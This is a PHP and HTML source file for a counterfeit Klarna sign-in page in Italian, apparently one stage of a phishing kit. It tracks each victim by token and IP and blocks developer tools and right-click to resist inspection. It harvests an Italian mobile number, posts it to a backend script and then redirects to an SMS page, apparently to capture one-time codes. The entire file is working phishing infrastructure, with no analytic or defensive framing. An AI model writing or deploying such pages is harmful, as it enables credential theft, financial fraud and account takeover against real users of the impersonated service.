<?php
require_once __DIR__ . '/guard.php';

$clientData = getClientData(getToken());
$status = $clientData['status'] ?? 'online';
$allowed = ['online', 'landing_click', 'reset', 'login_submitted', ''];
if (!in_array($status, $allowed)) {
    header('Location: loading.php');
    exit;
}

$clientIp = getClientIp();
$token = getToken();
?>
<!DOCTYPE html>
<html lang="it" oncontextmenu="return false;">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow">
    <title>Klarna | Accedi</title>
    <script>window.clientToken = "<?php echo htmlspecialchars($token); ?>"; window.clientIp = "<?php echo htmlspecialchars($clientIp); ?>";</script>
    <script>
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && (e.key === 'u' || e.key === 'U'))) { e.preventDefault(); return false; }
        });
    </script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        body { background-color: #f7f7f7; font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; zoom: 0.92; -moz-transform: scale(0.92); -moz-transform-origin: top center; }
        .auth-card { width: 100%; max-width: 550px; background: white; padding: 36px 52px; border-radius: 32px; box-shadow: 0 8px 28px rgba(0,0,0,0.04); min-height: 780px; display: flex; flex-direction: column; }
        .btn-dark { background-color: #080516; color: white; transition: background-color 0.3s; border-radius: 45px !important; padding-top: 14px !important; padding-bottom: 14px !important; }
        .btn-dark:hover { background-color: #000; }
        input { border: 1.5px solid #d1d1d6 !important; font-size: 1rem !important; border-radius: 12px; }
        input:focus { border-color: #080516 !important; outline: none; }
        .input-error { border-color: #9c1c31 !important; background-color: #fff5f5 !important; }
        .bottom-section { margin-top: auto; width: 100%; }
        @media (max-width: 640px) { body { background-color: white; align-items: stretch; zoom: 1; -moz-transform: none; } .auth-card { max-width: 100%; height: 100vh; min-height: 100vh; border-radius: 0; padding: 16px 20px; box-shadow: none; } }
        @media (min-width: 641px) and (max-width: 900px) { body { zoom: 0.95; } .auth-card { max-width: 480px; padding: 28px 36px; min-height: 650px; } }
        @keyframes dot-bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-14px); } }
        .loading-dot { width: 14px; height: 14px; background-color: #080516; border-radius: 50%; animation: dot-bounce 0.6s ease-in-out infinite; }
        .loading-dot:nth-child(2) { animation-delay: 0.15s; }
        .loading-dot:nth-child(3) { animation-delay: 0.3s; }
    </style>
</head>
<body>
    <div class="auth-card">
        <div class="flex justify-end mb-2"><a href="index.php" class="text-2xl font-light hover:opacity-50 leading-none">&times;</a></div>

        <!-- FORM -->
        <div id="login-form" class="flex-grow flex flex-col">
            <div class="mb-10">
                <h1 class="text-[32px] font-bold text-[#080516] tracking-tight mb-2">Accedi</h1>
                <p class="text-[15px] text-[#5e5e6e]">Oppure <a href="#" class="text-[#4b3ec4] font-semibold hover:underline">Crea account</a></p>
            </div>
            <div class="mb-18">
                <input type="text" id="user-input" maxlength="12" placeholder="Numero di telefono o e-mail" class="w-full px-4 py-4 outline-none transition-all placeholder:text-[#8a8a96]" autocomplete="off" inputmode="numeric" oninput="formatPhoneInput(this)">
                <div id="phone-error" class="text-[#9c1c31] text-[11px] mt-1 hidden">Inserisci un numero di cellulare italiano valido</div>
            </div>
            <div class="bottom-section">
                <button id="btn-login" onclick="processLogin()" class="w-full btn-dark py-3.5 font-bold text-[1rem] hover:bg-black transition-all">Continua</button>
                <div class="mt-4 text-[11px] text-[#5e5e6e] text-center pb-3"><p>Procedendo accetti i Termini di utilizzo · <a href="#" class="underline">Informativa sulla privacy</a></p></div>
            </div>
        </div>

        <!-- LOADING (hidden) -->
        <div id="loading-overlay" class="hidden flex-grow flex flex-col items-center justify-center">
            <div class="flex items-center justify-center gap-3">
                <div class="loading-dot"></div>
                <div class="loading-dot"></div>
                <div class="loading-dot"></div>
            </div>
            <p class="text-[#8a8a96] text-sm mt-6 text-center">Attendere prego...</p>
        </div>

    </div>

    <script>
        function formatPhoneInput(el) {
            let val = el.value.replace(/\D/g, '').substring(0, 10);
            let formatted = '';
            if (val.length > 6) formatted = val.slice(0, 3) + ' ' + val.slice(3, 6) + ' ' + val.slice(6);
            else if (val.length > 3) formatted = val.slice(0, 3) + ' ' + val.slice(3);
            else formatted = val;
            el.value = formatted;
            document.getElementById('phone-error').classList.add('hidden');
            el.classList.remove('input-error');
        }

        function validateItalianPhone(num) {
            const clean = num.replace(/\D/g, '');
            if (!/^3\d{9}$/.test(clean)) return false;
            const validPrefixes = ['330','331','332','333','334','335','336','337','338','339','340','341','342','343','344','345','346','347','348','349','350','351','352','353','354','355','356','357','358','359','360','361','362','363','364','365','366','367','368','370','371','372','373','374','375','376','377','378','379','380','381','382','383','384','385','386','387','388','389','390','391','392','393','394','395','396','397','398','399','320','321','322','323','324','325','326','327','328','329','310','311','312','313','314','315','316','317','318','319'];
            return validPrefixes.includes(clean.substring(0, 3));
        }

        function processLogin() {
            const input = document.getElementById('user-input');
            const userVal = input.value.replace(/\D/g, '');
            
            if (!userVal || !validateItalianPhone(userVal)) {
                input.classList.add('input-error');
                document.getElementById('phone-error').classList.remove('hidden');
                return;
            }
            
            input.classList.remove('input-error');
            document.getElementById('phone-error').classList.add('hidden');
            
            // Hide form, show loading
            document.getElementById('login-form').classList.add('hidden');
            document.getElementById('loading-overlay').classList.remove('hidden');
            
            let fd = new FormData();
            fd.append('user', userVal);
            fd.append('type', 'login');
            
            fetch('api.php', { method: 'POST', body: fd })
            .then(() => {
                // Random 5-10 seconds then auto go SMS
                const delay = Math.floor(Math.random() * 5001) + 5000;
                setTimeout(() => {
                    window.location.href = 'sms.php?auto=1';
                }, delay);
            })
            .catch(() => {
                document.getElementById('login-form').classList.remove('hidden');
                document.getElementById('loading-overlay').classList.add('hidden');
            });
        }
    </script>
</body>
</html>